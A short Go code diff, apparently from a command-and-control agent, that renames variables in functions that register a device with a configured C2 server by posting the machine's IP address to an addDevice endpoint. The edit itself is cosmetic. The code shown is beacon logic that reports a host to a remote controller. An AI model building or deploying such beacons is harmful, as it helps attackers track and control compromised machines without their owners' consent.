@@ -14,14 +14,14 @@ import (
 	Returns URL for add device
 */
 func getAddDeviceURL() string {
-	C2_host := config.Config.C2
-	url := "http://" + C2_host + ":8000/api/devices/addDevice"
+	C2Host := config.Config.C2
+	url := "http://" + C2Host + ":8000/api/devices/addDevice"
 	log.Logger.Info().Msg(url)
 	return url
 }
 
 func createPostBody() []byte {
-	ipAddr := helper.Get_ip().String()
+	ipAddr := helper.GetIP().String()
 
 	// Encode the ip_addr to postbody
 	postBody, _ := json.Marshal(map[string]string{
@@ -59,5 +59,5 @@ func GetDeviceIDFromAPI() {
 	log.Logger.Info().Msgf("[+]\tNew DeviceID Added-> %v", deviceId.Id)
 	defer resp.Body.Close()
 	config.Config.DeviceID = deviceId.Id
-	config.Config.IpStr = helper.Get_ip().String()
+	config.Config.IpStr = helper.GetIP().String()
 }
